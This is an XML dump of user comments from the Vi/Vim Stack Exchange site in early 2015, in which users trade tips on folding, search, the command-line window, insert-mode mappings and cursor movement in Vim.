  <row Id="1999" PostId="2278" Score="5" Text="You could write your text as normal, and then do `:s/./% \0\r/` to add the `%` and newlines ... Not a *great* solution, though..." CreationDate="2015-02-28T00:26:55.547" UserId="51" />
  <row Id="2000" PostId="2278" Score="0" Text="Nice solution, it kinda works. Will be using it for now, thank you." CreationDate="2015-02-28T00:47:54.570" UserId="669" />
  <row Id="2001" PostId="2282" Score="0" Text="Seems like there is a `set foldlevel=0` needed? But maybe that's default." CreationDate="2015-02-28T03:16:02.880" UserId="925" />
  <row Id="2002" PostId="2282" Score="1" Text="Yeah the default is zero, but if it doesn't work without, adding it can't hurt. :-)" CreationDate="2015-02-28T03:18:03.703" UserId="1094" />
  <row Id="2003" PostId="2282" Score="0" Text="But now... how to switch it back again, with no traces?" CreationDate="2015-02-28T03:23:09.520" UserId="925" />
  <row Id="2004" PostId="2282" Score="0" Text="in normal mode, you can use 'zi' to toggle folding off and on." CreationDate="2015-02-28T04:04:31.660" UserId="227" />
  <row Id="2005" PostId="2283" Score="0" Text="I am not sure what your question is here. Do you want general highlight of the search string? Or highlighting as you type? Do you want to change the color of the highlighting based on the type of search string?" CreationDate="2015-02-28T10:30:33.513" UserId="66" />
  <row Id="2007" PostId="760" Score="1" Text="@joeytwiddle no, `$` moves *to* the end of the line, but doesn't include the newline. It's the difference between `0y$` and `yy`. Putting `h` after the `$` would just mean that you'd miss the last character." CreationDate="2015-02-28T11:10:58.227" UserId="514" />
  <row Id="2008" PostId="2283" Score="0" Text="Some basic highlighting is available in the search window (invoked by `q/`). It's not extensive, but perhaps a syntax plugin could improve it." CreationDate="2015-02-28T12:04:30.380" UserId="64" />
  <row Id="2009" PostId="2283" Score="0" Text="I guess I was thinking about the command window (`q:`). It uses VimScript highlighting." CreationDate="2015-02-28T12:11:33.020" UserId="64" />
  <row Id="2010" PostId="2283" Score="0" Text="@Bernhard Yes, it should be highlighting as you type, ideally.  Thanks to point it out. Basically, I want to make the syntax of the pattern after `/` visible. Literal text should be a fixed color (a code fragment in the pattern is not highlighted)." CreationDate="2015-02-28T15:28:45.643" UserId="925" />
  <row Id="2011" PostId="2285" Score="0" Text="I think this answer is improved over the previous one as it restores the last search term. Marking this as correct." CreationDate="2015-02-28T15:50:21.740" UserId="91" />
  <row Id="2012" PostId="457" Score="0" Text="I've rolled back the edit, as it wasn't my intent. Although it's clear I didn't understand the difference between the command-line window and Ex mode, I think there quite a difference between the two (it turns out) and I think my question was definitely focused on Ex mode. &quot;What's the usefulness of command editing mode?&quot; could definitely be another question." CreationDate="2015-02-28T15:54:10.083" UserId="91" />
  <row Id="2013" PostId="2282" Score="0" Text="Most of the time when I do this I first `:tab sp` to get a new throwaway view on the file. Then going back is as simple as `:close` or any other way to kill the tab." CreationDate="2015-02-28T17:49:09.047" UserId="1094" />
  <row Id="2014" PostId="2292" Score="1" Text="This is the &quot;original grep&quot; (`g/REgexp/p`) ... Problem is that you can't easily jump to one of the matches, though..." CreationDate="2015-02-28T19:44:02.883" UserId="51" />
  <row Id="2015" PostId="2292" Score="0" Text="@Carpetsmoker: You're right; for that, I have a plugin, see my other answer." CreationDate="2015-02-28T20:00:38.487" UserId="970" />
  <row Id="2016" PostId="2292" Score="0" Text="That could be useful for many cases. Can the output be redirected to a new buffer? That would allow to still have syntax highlighting on the lines. (Hmm... that raises another question, wait a second...)" CreationDate="2015-02-28T20:18:15.767" UserId="925" />
  <row Id="2017" PostId="2296" Score="1" Text="It's not really clear to me what exactly you're asking. Could you provide a simple example of what you've done, what happened, and what you would like to happen? This should probably make it clearer." CreationDate="2015-03-01T02:53:40.917" UserId="51" />
  <row Id="2019" PostId="2291" Score="0" Text="I think the [VimRegEx.vim](http://www.vim.org/scripts/script.php?script_id=1091) plugin perhaps does this? I haven't tried it." CreationDate="2015-03-01T03:03:50.697" UserId="51" />
  <row Id="2020" PostId="2297" Score="0" Text="In iTerm, what does `echo $TERM` output? Additionally, you might want to check what `:hi Comment` says, particularly about the cterm setting. It might be setting italics when iTerm does not have support for italics (well it does but lets just assume it doesn't, because the solution is quite hacky)" CreationDate="2015-03-01T03:12:46.560" UserId="246" />
  <row Id="2021" PostId="2297" Score="0" Text="Also, do not manually set `t_Co`. Vim is quite capable of reading the $TERM variable to see if the terminal does support 256colors. Manually setting it will break havoc (okay I exaggerate a bit) if the Terminal does not support 256 colors." CreationDate="2015-03-01T03:18:47.787" UserId="246" />
  <row Id="2022" PostId="2252" Score="0" Text="your solution would work for functions and so, but not for blocks embedded in them. you can use the `a1` and `s1` return values for implementing this." CreationDate="2015-03-01T06:03:11.583" UserId="342" />
  <row Id="2023" PostId="2252" Score="0" Text="@elyashiv Like I said, I have no idea how Pascal looks as I've never programmed a line of Pascal. I've conservatively implemented a very basic foldexpr (this is also why we anchor the matches to the start of the line). In any case, using syntax-based folding is probably the better way to go if you want full folding of everything... Many people only use folding for functions, though, so this simple method may still prove useful for some :-)" CreationDate="2015-03-01T06:06:14.213" UserId="51" />
  <row Id="2027" PostId="2244" Score="0" Text="My answer appears to be a poor man's approximation of the [numbers.vim](http://myusuf3.github.io/numbers.vim/) plugin offered in another answer. ;-)" CreationDate="2015-03-01T07:57:55.737" UserId="630" />
  <row Id="2028" PostId="2081" Score="1" Text="I had this problem too and worked around it by using `BufReadPost,BufEnter,BufWinEnter`, but it still appeared sometimes. Thanks to this note on `--remote-send` I was able to find a reason of such behaviour, [see this vim-dev post](https://groups.google.com/forum/#!topic/vim_dev/2nrIOoiJzVU). So maybe it will be fixed in Vim soon. Another temporary half workaround is to set `'autochdir'` option, if you're fine with changing directory for all filetypes." CreationDate="2015-03-01T08:35:10.643" UserId="860" />
  <row Id="2029" PostId="2081" Score="0" Text="@xaizek thanks --- this is clearly the case for the behavior descried here. I have a workaround in the [linked post](http://vi.stackexchange.com/questions/2082/how-to-escape-a-whole-string-in-a-command) --- I do not like `autochdir` for all files (even for TeX files, I do want the switch only for `.tex`, not for example `.sty`...)" CreationDate="2015-03-01T10:03:26.530" UserId="854" />
  <row Id="2031" PostId="2296" Score="0" Text="I think all of the settings you're talking about are related to filetype. It's likely that by saving the new file with the right file extension, these settings would be applied. If you don't want to save the new file, you can try something like `:setfiletype javascript`." CreationDate="2015-03-01T12:37:40.493" UserId="64" />
  <row Id="2032" PostId="2289" Score="1" Text="A rebuttal to Known Issue #1: You shouldn't leave Insert mode with `&lt;C-C&gt;`." CreationDate="2015-03-01T12:49:17.240" UserId="64" />
  <row Id="2033" PostId="2289" Score="0" Text="@tommcdo, I don't, but if it's there, someone uses it. It's actually useful to avoid abbreviation expansion, I'm wondering why `InsertLeave` is not triggered for this key." CreationDate="2015-03-01T12:56:28.967" UserId="860" />
  <row Id="2034" PostId="2289" Score="1" Text="I suppose I mean to promote a trend of rejecting `&lt;C-C&gt;` as a good way to exit Insert mode. The way you've mentioned it could imply that it's sometimes a good method. It's kind of like saying &quot;Caveat: your document won't be saved if you close Microsoft Word by unplugging your computer.&quot;" CreationDate="2015-03-01T13:04:05.633" UserId="64" />
  <row Id="2035" PostId="2289" Score="0" Text="@tommcdo Didn't think it might sound this way. Added a note about `&lt;C-C&gt;` being the reason of the issue. I'm not aware of another method to leave insert mode suppressing abbreviation expansion as `&lt;C-C&gt;` does, if there is no, it's useful at least as part of a mapping like `inoremap &lt;silent&gt; &lt;c-c&gt; &lt;c-c&gt;:doautocmd InsertLeave&lt;cr&gt;`." CreationDate="2015-03-01T13:37:45.547" UserId="860" />
  <row Id="2036" PostId="2289" Score="0" Text="I hadn't considered abbreviations, that's a good point. I even found some places in the help that describe `&lt;C-C&gt;` as leaving Insert mode without expanding abbreviations, and there's no mention of how it doesn't trigger `InsertLeave` events. I'm now curious if there is a built-in way to do that, but for now your mapping is a great idea." CreationDate="2015-03-01T13:51:42.710" UserId="64" />
  <row Id="2037" PostId="2289" Score="0" Text="@tommcdo, see `:help i_CTRL-C`, it says `Does not trigger the InsertLeave autocommand event.` in documentation for Vim 7.4.050 (the oldest runtime files I have around)." CreationDate="2015-03-01T14:03:42.557" UserId="860" />
  <row Id="2038" PostId="2289" Score="0" Text="In quickref.text, under Q_ai (Insert mode keys), it's described simply as &quot;Like `&lt;Esc&gt;`, but do not use an abbreviation&quot;. Admittedly, I had to go out of my way to find this example." CreationDate="2015-03-01T14:08:57.180" UserId="64" />
  <row Id="2039" PostId="2303" Score="0" Text="Also ensure encoding in Vim is unicode before replacement." CreationDate="2015-03-01T16:14:20.477" UserId="220" />
  <row Id="2040" PostId="2303" Score="0" Text="That's what the second argument in nr2char() is for" CreationDate="2015-03-01T16:24:06.433" UserId="71" />
  <row Id="2041" PostId="2303" Score="0" Text="Yes, but if one have e.g. `set enc=latin1` and do the substitution, the `u05E2` would result in the glyph `â` or `0xe2` and not `ע`. With `enc=utf-8` one get `ע` or `0x05e2`. Not sure what exactly happens, but likely `nr2char()` returns the full utf-8 code, and then it is *“cut off”* and the leading byte silently thrown away due to enc setting." CreationDate="2015-03-01T17:25:25.483" UserId="220" />
  <row Id="2042" PostId="2298" Score="0" Text="Yep - looks like the update fixed my issue. Thanks!" CreationDate="2015-03-01T17:43:11.053" UserId="1133" />
  <row Id="2043" PostId="2303" Score="0" Text="As the utf-8 sequence for Unicode `05e2` is `d7a2` the above assumption is perhaps wrong." CreationDate="2015-03-01T17:47:53.583" UserId="220" />
  <row Id="2044" PostId="293" Score="1" Text="It would be nice if you could post some details of the plugin, such as dependencies (if any), a couple of usage examples, etc." CreationDate="2015-03-01T18:59:44.263" UserId="205" />
  <row Id="2045" PostId="2306" Score="5" Text="Yes, the default HTML syntax script provides folding. Unless you use an alternative script, that's _the_ way to do syntax folding. Can it recognize JavaScript? Why don't you simply try? So, what's your question?!" CreationDate="2015-03-01T20:10:09.993" UserId="970" />
  <row Id="2046" PostId="2301" Score="1" Text="The best way to find out what a single command in Vim does, is not google, but the help system. Simply type `:h f` to get help on the `f` command." CreationDate="2015-03-01T20:35:41.313" UserId="342" />
  <row Id="2047" PostId="102" Score="0" Text="My web service log file has a line that's 98518 characters wide. When wrapped it fills more than 1 screen. How can I scroll it smoothly in vim? Using navigation keys like $ and w isn't quite working, is there another key that jumps say 1000 characters at a time?" CreationDate="2015-03-02T01:58:08.647" UserId="398" />
  <row Id="2048" PostId="102" Score="0" Text="@ropata You could use something like `nnoremap H 1000h` and `nnoremap L 1000l` in your `.vimrc` to make `H` move left 1000 characters and similar for `L`, or you could wrap the line (`gww`) within Vim. But that's a different question, which you should [ask as a separate question](http://vi.stackexchange.com/questions/ask)." CreationDate="2015-03-02T02:05:13.037" UserId="88" />
  <row Id="2050" PostId="2307" Score="0" Text="I ended up using the command sequence `10gj` [from SO](http://stackoverflow.com/questions/4946421/vim-moving-with-hjkl-in-long-lines-screen-lines) to jump down 10 lines at a time. Perhaps there's an easier way?" CreationDate="2015-03-02T02:12:30.970" UserId="398" />
  <row Id="2051" PostId="2307" Score="0" Text="I don't don't see what's wrong with using `10gj`? Seems pretty easy to me. You can of course rebind this (see linked question) to make it slightly easier." CreationDate="2015-03-02T02:15:12.087" UserId="51" />
  <row Id="2052" PostId="676" Score="0" Text="I personally view a camalCased word as a whole word and don't like the idea of breaking half way into a word because of case or underscore. Usually I use the `f` and `t` keys to manage inner word movements." CreationDate="2015-03-02T05:04:56.783" UserId="544" />
  <row Id="2053" PostId="2307" Score="0" Text="I'd recommend piping the file to an XML reformatter. If you need it recompressed for writing, pipe again to a minimizer. If you do this often, it should be possible to write a mapping/plugin that opens the current visual selection in a new buffer, reformatted, and leave a couple marks on the original so that when the buffer is saved, it's written to the original location, reuglified." CreationDate="2015-03-02T10:23:07.020" UserId="632" />
  <row Id="2054" PostId="2301" Score="1" Text="@elyashiv not very useful when one thinks of the command as `fg`. What does `:he fg` give you?" CreationDate="2015-03-02T11:04:41.317" UserId="205" />
  <row Id="2055" PostId="676" Score="0" Text="@Sukima that's what I was doing until I asked this question, but it requires more &quot;brain power&quot; to think about which character to `t` to, instead of just going to the next capital letter." CreationDate="2015-03-02T12:36:39.180" UserId="79" />
  <row Id="2056" PostId="2310" Score="1" Text="Both can be solved by using the command-line window with `:q`; this opens a new &quot;buffer-like&quot; window, in which you can use `hjkl` for movement, `y` for yanking, etc." CreationDate="2015-03-02T13:51:45.247" UserId="51" />
  <row Id="2057" PostId="2310" Score="1" Text="@Carpetsmoker (you mean `q:`, right?) Good to know! I had accidentally got there in the past, but not really thought about using it. It doesn't seem to work with `/` though (search)." CreationDate="2015-03-02T14:13:36.363" UserId="850" />
  <row Id="2058" PostId="90" Score="0" Text="@yo', well, in `g5j`, `g5` is seen first, which just jumps to the next `5` before you apply the `j`. That's why it can't do what `5gj` does." CreationDate="2015-03-02T14:17:40.743" UserId="850" />
  <row Id="2060" PostId="2312" Score="2" Text="`&lt;C-f&gt;` is very useful to know, since it works after you are already half-way through the command." CreationDate="2015-03-02T14:20:31.620" UserId="850" />
  <row Id="2061" PostId="2312" Score="1" Text="I agree; the `:` comes almost automatically for me, so it's good to be able to switch without going back to normal mode." CreationDate="2015-03-02T14:21:26.690" UserId="970" />
  <row Id="2063" PostId="2310" Score="0" Text="Oops, yes, I meant q: ... I never used it much, so I can't give you a full/proper answer..." CreationDate="2015-03-02T15:10:39.723" UserId="51" />
  <row Id="2064" PostId="2256" Score="0" Text="@Carpetsmoker, maybe you can find [this post](http://rlog.rgtti.com/2014/05/01/how-to-modify-a-keyboard-layout-in-linux/) interesting. I have added a `dead-greek` key to my layout now, and `alt-g b` gives me a nice β... and using CapsLock as a compose key is really the best thing after slices bread." CreationDate="2015-03-02T17:05:34.740" UserId="854" />
  <row Id="2065" PostId="2318" Score="2" Text="Simply creating a `~/.vimrc` file will also enable `'nocompatible'` mode." CreationDate="2015-03-02T17:51:29.437" UserId="15" />
  <row Id="2066" PostId="2303" Score="0" Text="@Sukminder - my experience is that unicode encodings are handled specially for situations like this and use the unicode codepoint as the ordinal rather than the multibyte sequence." CreationDate="2015-03-02T19:35:22.267" UserId="880" />
  <row Id="2067" PostId="1985" Score="0" Text="Why isn't -= smarter about this sort of thing? It knows that formatoptions is a &quot;single letter flags&quot; option because += doesn't do the comma." CreationDate="2015-03-02T19:38:48.537" UserId="880" />
  <row Id="2068" PostId="457" Score="1" Text="@AndrewFerrier You asked about `q:` specifically, and mentioned it as, among the two key sequences, the one you have the most issue with. And two of the answers here may be useful to people who are searching for it by the correct term." CreationDate="2015-03-02T19:41:00.210" UserId="880" />
  <row Id="2069" PostId="2321" Score="0" Text="Is there a way to do this while leaving the cursor alone?" CreationDate="2015-03-02T20:17:44.993" UserId="880" />
  <row Id="2070" PostId="2321" Score="0" Text="@Random832 Adding a `\`\`` to the end will return the cursor to the previous location." CreationDate="2015-03-02T20:22:46.940" UserId="1166" />
  <row Id="2071" PostId="2321" Score="0" Text="I'm concerned that this will make it not apply the selection to the yank command. I'll experiment some today." CreationDate="2015-03-02T20:24:52.893" UserId="880" />
  <row Id="2072" PostId="2301" Score="0" Text="@muru a lout of information - you find out there is no command `fg` (just `-fg`), so you conclude the command is f..." CreationDate="2015-03-02T20:40:19.117" UserId="342" />
  <row Id="2073" PostId="2321" Score="1" Text="I added a marker command to the mapping, it should leave the cursor where it is now." CreationDate="2015-03-02T20:42:06.290" UserId="865" />
  <row Id="2074" PostId="2318" Score="2" Text="Relevant documentation: `:help cpo-u` and `:help undo-two-ways`" CreationDate="2015-03-02T20:57:12.140" UserId="1170" />
  <row Id="2075" PostId="2308" Score="0" Text="Thanks for the tips, I will experiment with xmllint" CreationDate="2015-03-02T21:02:28.150" UserId="398" />
  <row Id="2076" PostId="2306" Score="0" Text="You are right. I edited the question, I want to enable the default HTML syntax folding. Am I missing something?" CreationDate="2015-03-02T22:19:31.780" UserId="977" />
  <row Id="2077" PostId="2325" Score="0" Text="Ah okay so I can just add that to my `.vimrc` then?" CreationDate="2015-03-03T02:06:08.947" UserId="1065" />
  <row Id="2079" PostId="1985" Score="0" Text="@Random832 It's just a string value ... There is no &quot;single-letter-flags&quot; type in Vim; it just gets interpreted that way... This is not ideal, but I don't see it as a huge problem, either..." CreationDate="2015-03-03T10:31:06.783" UserId="51" />
  <row Id="2081" PostId="1985" Score="0" Text="@Carpetsmoker If that were true then `+=` wouldn't have special handling for it either. Vim obviously has a list somewhere of which options work this way." CreationDate="2015-03-03T11:42:12.410" UserId="880" />
  <row Id="2082" PostId="1985" Score="0" Text="@Random832 Right, it does seem to do special tricks with `+=` ... meh :-/" CreationDate="2015-03-03T11:47:10.800" UserId="51" />
  <row Id="2084" PostId="2320" Score="0" Text="Wow, all this time I was using `mmgg&quot;+yG\`m` and never thought of this. Thanks, this is going right in the .vimrc." CreationDate="2015-03-03T14:01:48.887" UserId="88" />
  <row Id="2086" PostId="2316" Score="0" Text="Using `.` for multiple undos doesn't work in Vim. That's a feature specific to nvi, which is an entirely different (re-)implementation of vi." CreationDate="2015-03-03T15:04:19.347" UserId="343" />
  <row Id="2087" PostId="2330" Score="2" Text="Note that you'll likely want to use `&amp;l:shiftwidth` to only change the buffer local variable." CreationDate="2015-03-03T15:26:14.857" UserId="15" />
  <row Id="2088" PostId="2341" Score="4" Text="I realise this is the Vi(m) SE site, but `sed` is a rather lighter solution to this: `sed -i 's/v0.0.2/v0.0.3/g' *.pl`" CreationDate="2015-03-03T15:26:54.993" UserId="646" />
  <row Id="2089" PostId="2339" Score="0" Text="I removed the hash (not sure what it's for), and I want to match anywhere in the line, so I removed the caret, and I had to escape special characters to use it in my modeline, but it works: `&quot; vim:set foldmethod=expr foldexpr=getline(v\:lnum)=~\'&gt;&gt;&gt;\'?\'&gt;1\'\:\'=\' foldlevel=0 foldclose= :`" CreationDate="2015-03-03T15:32:37.813" UserId="1176" />
  <row Id="2090" PostId="2339" Score="1" Text="Great! The `=~#` is for case-sensitive matching; it doesn't matter here (but I like to be explicit). You could define a `:function` in your vimrc and reference that in the modeline; would save you from the escaping (and repetition)." CreationDate="2015-03-03T15:38:40.490" UserId="970" />
  <row Id="2093" PostId="2344" Score="1" Text="Awesome! `&lt;ctrl-r&gt;` would be particularly useful." CreationDate="2015-03-03T15:57:57.170" UserId="850" />
  <row Id="2094" PostId="2340" Score="0" Text="This doesn't seem possible as near as I can figure out... Even piping characters to external programs (`xxd`, `hexdump`) seems difficult, since many functions don't seem to be multibyte-aware enough (at least not with BIG-5)..." CreationDate="2015-03-03T16:48:22.360" UserId="51" />
  <row Id="2095" PostId="121" Score="1" Text="You want an :argdo, if you run this for a couple of files on the commandline" CreationDate="2015-03-03T17:29:16.037" UserId="71" />
  <row Id="2096" PostId="2347" Score="7" Text="I would suggest that you learn to program C (or C++, Java, Javascript) better. There are many cases where you do **NOT** want to add a `;`, for example when breaking a function call with many arguments over 2 or more lines... Scripting all of these cases is difficult... You will quickly get used to adding the semicolons, so just hang in there for a little while :-)" CreationDate="2015-03-03T18:13:22.453" UserId="51" />
  <row Id="2097" PostId="2347" Score="0" Text="Thanks for the tip. I know about that which is why I put `etc.` in my exceptions. This is also why I want to toggle it on and off." CreationDate="2015-03-03T18:18:11.760" UserId="1168" />
  <row Id="2098" PostId="2134" Score="2" Text="Fixed. Now, blacklists &amp; co are supported." CreationDate="2015-03-03T18:39:59.627" UserId="626" />
  <row Id="2099" PostId="2318" Score="0" Text="Thanks Quincy and jamessan.  Just creating the ~/.vimrc file worked!" CreationDate="2015-03-03T18:59:03.137" UserId="1162" />
  <row Id="2100" PostId="2348" Score="1" Text="You can't add blank lines now :-) ... There are probably many more situations where this will do unexpected things  !" CreationDate="2015-03-03T19:55:12.743" UserId="51" />
  <row Id="2101" PostId="2348" Score="1" Text="Yep, that was the first thing I noticed too. It will also add a semicolon even if the line already has a semicolon at the end of it and fail for many other instances where the end of a line is not the end of a statement. I really hope the code I use above is not used by someone for semicolon insertion, but maybe it will help someone apply these tricks to a different use case. If someone adds enough exceptions that they truly feel that automatic insertion improves their workflow, then good on them." CreationDate="2015-03-03T21:24:33.940" UserId="680" />
  <row Id="2102" PostId="2348" Score="0" Text="On a related note, I sometimes find myself accidentally adding semicolons in python, so I do `inoremap ; _` for those files. Gives me a slightly easier way to type underscores, but when I do type a semicolon at the end of a line, I notice the character change and instantly catch my error." CreationDate="2015-03-03T21:26:27.553" UserId="680" />
  <row Id="2103" PostId="2348" Score="2" Text="@Carpetsmoker thank you for pointing this out. Also thank you @_MattBoehm for giving me the starter code. Looks like I will need to add the new line exception too! Looks like a fun challenge! Looks like I will learn vim code and c++ the dame time. Challenge accepted! Will try code tomorrow." CreationDate="2015-03-03T21:30:21.743" UserId="1168" />
  <row Id="2104" PostId="2342" Score="1" Text="Also see the following [Vimcasts](http://vimcasts.org/) episode: [Project-wide find and replace](http://vimcasts.org/episodes/project-wide-find-and-replace/)" CreationDate="2015-03-03T21:36:06.273" UserId="778" />
  <row Id="2105" PostId="2348" Score="0" Text="Could you also show me how to add more then one regex match please?" CreationDate="2015-03-03T22:40:02.247" UserId="1168" />
  <row Id="2106" PostId="2348" Score="1" Text="You can either try to expand the pattern to match more cases or change `match(...)==-1` to `((match(...)==-1) || (match(...)==-1)). Instead of `||` you may have to escape them as `&lt;BAR&gt;&lt;BAR&gt;`." CreationDate="2015-03-03T22:44:54.620" UserId="680" />
  <row Id="2107" PostId="2350" Score="1" Text="Does `Alt` (press, not hold) and then `j` work? With `xterm` at least I need to set `metaSendsEscape` to `true`  to get these sequences to work... I don't know if you have the same problem, and I don't use OSX so I can't test..." CreationDate="2015-03-03T23:16:30.427" UserId="51" />
  <row Id="2108" PostId="2350" Score="0" Text="@Carpetsmoker Pressing `Alt`, release, then `j` or any other key works as normal. I've checked and found the option ['Use option as meta key'](http://apple.stackexchange.com/a/54784/22781), enabled it and it works now. So setting `metaSendsEscape` did the trick, thanks." CreationDate="2015-03-03T23:41:08.447" UserId="467" />
  <row Id="2110" PostId="2337" Score="0" Text="gvim defaults for `StatusLine` are: `term=bold,reverse cterm=bold,reverse gui=bold,reverse`, and for `StatusLineNC` the values are `term=reverse cterm=reverse gui=reverse`" CreationDate="2015-03-04T02:24:42.927" UserId="398" />
  <row Id="2111" PostId="2351" Score="0" Text="I endorse this approach! Collect a few of these files (e.g. dofoo.vim dobar.vim) in a directory and then `:source {filename}` the one you need." CreationDate="2015-03-04T03:03:30.897" UserId="398" />
  <row Id="2113" PostId="2341" Score="0" Text="@MichaelColes Yes, but not all Vim users have sed on their computers." CreationDate="2015-03-04T07:54:04.673" UserId="343" />
  <row Id="2116" PostId="2348" Score="0" Text="I have tried your code and it works however I have tried to edit it and I get a error with this code `inoremap &lt;CR&gt; &lt;C-R&gt;=((match(getline('.'), '\s*/\*')==-1) || (match(getline('.'), '\s*/\int')==-1))?';':''&lt;CR&gt;&lt;CR&gt;` The error is `empty buffer`. How would I solve it." CreationDate="2015-03-04T10:53:15.023" UserId="1168" />
  <row Id="2117" PostId="2341" Score="0" Text="@MichaelColes Very nice. It's always nice to know of alternatives. Not everyone here might agree, but I'd upvote that as an answer." CreationDate="2015-03-04T12:10:32.447" UserId="1111" />
  <row Id="2118" PostId="2341" Score="0" Text="@Rich: fair point :)" CreationDate="2015-03-04T12:12:48.643" UserId="646" />
  <row Id="2119" PostId="2342" Score="0" Text="@PeterRincker Thanks for the link. I'd upvote that if you'd post it as an answer." CreationDate="2015-03-04T12:15:24.037" UserId="1111" />
  <row Id="2122" PostId="119" Score="0" Text="See also: [How to edit files non-interactively (e.g. in pipeline)?](http://vi.stackexchange.com/q/788/467)" CreationDate="2015-03-04T12:34:30.883" UserId="467" />
  <row Id="2123" PostId="2341" Score="1" Text="@ChristopherBottoms I might too, especially if the answer pointed out the relation between sed and vi, and noted the similarities in some of the things you can do with them." CreationDate="2015-03-04T14:40:54.660" UserId="343" />
  <row Id="2125" PostId="2348" Score="0" Text="When I paste that in and replace `|` with `&lt;BAR&gt;` I get no errors. I assume the error is in another part of your vimrc. You can test this by temporarily replacing your vimrc with that one line and seeing if the problem persists. Perhaps you incorrectly tried to use `#` as a comment character?" CreationDate="2015-03-04T15:14:31.160" UserId="680" />
  <row Id="2126" PostId="2361" Score="4" Text="May also want to look at `:h :map-alt-keys` as another source of information" CreationDate="2015-03-04T17:02:07.620" UserId="778" />
  <row Id="2127" PostId="2348" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/21644/discussion-between-apydeveloper-and-matt-boehm)." CreationDate="2015-03-04T17:20:09.450" UserId="1168" />
  <row Id="2130" PostId="2348" Score="0" Text="Here's what finally worked for me: `inoremap &lt;CR&gt; &lt;C-R&gt;=((match(getline('.'), '\s*/\*')==-1) &amp;&amp; (match(getline('.'), '\s*/int')==-1))?';':''&lt;CR&gt;&lt;CR&gt;`" CreationDate="2015-03-04T18:24:20.043" UserId="680" />
  <row Id="2131" PostId="2360" Score="0" Text="I knew that @muru would not resist to find the right script! Btw, would be better to add also the keywords from latex-suite dictionary..." CreationDate="2015-03-04T19:15:08.430" UserId="854" />
  <row Id="2132" PostId="2360" Score="1" Text="Done. It added 600+ words to the list from detexify. :)" CreationDate="2015-03-04T19:40:59.317" UserId="205" />
  <row Id="2133" PostId="2366" Score="0" Text="Thanks for mentioning my plugin; I was just about to recommend that as an alternative :-)" CreationDate="2015-03-04T20:54:30.520" UserId="970" />
  <row Id="2134" PostId="2366" Score="1" Text="Clever use of subscripting!" CreationDate="2015-03-04T22:00:23.290" UserId="142" />
  <row Id="2135" PostId="2370" Score="0" Text="Is that your entire vimrc file? `Plugin 'vimwiki'` looks like Vundle, but AFAIK you *need* to use `call vundle#begin()` and `call vundle#end()`..." CreationDate="2015-03-04T22:01:56.013" UserId="51" />
  <row Id="2136" PostId="2364" Score="1" Text="It might be useful, but I think this post is more suited to a comment, since it doesn't even come close to answering the question." CreationDate="2015-03-04T22:03:10.313" UserId="205" />
  <row Id="2137" PostId="2370" Score="0" Text="@Carpetsmoker No, it's not my entire vimrc :-). I've published only the settings that are related to vimwiki. Yes, I'm using Vundle to manage my plugins. Thanks for editing my question b.t.w. :-)." CreationDate="2015-03-04T22:06:36.420" UserId="1214" />
  <row Id="2138" PostId="2358" Score="0" Text="Complementary to this, there's [detexify](http://detexify.kirelabs.org/classify.html) for when you know how to draw a character but you don't remember the name of the command." CreationDate="2015-03-04T22:09:12.470" UserId="8" />
  <row Id="2139" PostId="2366" Score="6" Text="Could you please add an explanation?  I haven't seen this syntax before, and I would like to know how it works." CreationDate="2015-03-04T22:37:54.240" UserId="865" />
  <row Id="2140" PostId="2364" Score="0" Text="@muru Somehow it's approaching the same problem from a different side: We can not visualize the structure of the pattern in real time; Ok, but instead we visualize what the pattern does in real time. I take it as at least related enough to be an answer - and it may turn out to be pretty useful." CreationDate="2015-03-04T22:43:13.247" UserId="925" />
  <row Id="2142" PostId="2371" Score="0" Text="I'm using a standard qwerty layout. Just now tried starting without vimrc and the problem persists. Looked for mapping and it says no mapping found. You are correct, left and right work just fine. The behavior of up and down is somewhat sporadic. Sometimes it doesn't work at all. Other times, like right now, it jumps from the top of the file to the bottom of the file. The cursor never jumps higher than the last position it was at when going up,  and it always goes to the bottom left when going down." CreationDate="2015-03-05T02:21:46.713" UserId="1220" />
  <row Id="2143" PostId="2371" Score="0" Text="You might then try `:verbose :nmap j` to see if something else happened to clear it (this should say what last set `:nmap j`). Also, do `gj` and `gk` work? What if you enter visual mode first (type `v`) and then hit `j`, `k`, or `gj`, `gk`, or `&lt;UP&gt;`, `&lt;DOWN&gt;`?" CreationDate="2015-03-05T02:42:18.817" UserId="130" />
  <row Id="2144" PostId="2371" Score="0" Text="OK, verbose still yields no mapping found. Interestingly enough, gj and gk work in both normal and visual mode. Why is that?" CreationDate="2015-03-05T02:47:16.740" UserId="1220" />
  <row Id="2145" PostId="2330" Score="0" Text="I'll mark this as accepted since it technically answers my question. I do still have to set both values separately if I wanna change tabstop/shiftwidth values in a running instance of vim." CreationDate="2015-03-05T03:09:38.450" UserId="200" />
  <row Id="2146" PostId="2371" Score="0" Text="Just fixed it. Not sure why it doesn't work, but your advice about gj and gk gave me something to go on, and I found how to reverse Map the keys so that I can go line be line with just j and k And just several lines with gj and gk. Thank you so much! @mixedmath" CreationDate="2015-03-05T04:53:03.457" UserId="1220" />
  <row Id="2147" PostId="2366" Score="0" Text="@EvergreenTree The Vim variable 'v:searchforward' is 0 after a reverse search (e.g. '?') and 1 after a forward search (e.g. '/'). That is then used as the index to pick which letter ('n' or 'N') to use for the search. So, 'n' is mapped to 'N' if the search was reversed, but 'n' is mapped to 'n' for forward (e.g. it is left alone). The result is that 'n' will always search forward. The opposite is done for 'N'." CreationDate="2015-03-05T05:47:21.287" UserId="227" />
  <row Id="2148" PostId="2366" Score="1" Text="@EvergreenTree: Added some more explanation" CreationDate="2015-03-05T07:00:16.917" UserId="71" />
  <row Id="2149" PostId="2366" Score="0" Text="@IngoKarkat: I remembered your plugin from a similar question, so I mentioned it ;)" CreationDate="2015-03-05T07:01:17.267" UserId="71" />
  <row Id="2150" PostId="2371" Score="11" Text="It sounds like your file might be just a single line. In Vim, `k` and `j` go up and down one actual line, rather than one visible line. If your line wraps at 80 characters, and you have 100 characters, that is one line to Vim, even though it is displayed as two lines. `gk` and `gj` use display lines rather than actual lines, which is more in line (no pun intended) with what gui-based text editors do." CreationDate="2015-03-05T09:36:34.143" UserId="163" />
  <row Id="2152" PostId="2374" Score="0" Text="can you plz post your .vimrc file?" CreationDate="2015-03-05T11:36:59.117" UserId="342" />
  <row Id="2153" PostId="2371" Score="0" Text="Ah. Didn't know that. I am following along with a tutorial and I copied and pasted a paragraph from the PDF. So I suppose that could lose it's formatting in the crossover. I'll test for that. Changing back will be real easy. :-)" CreationDate="2015-03-05T11:48:52.680" UserId="1220" />
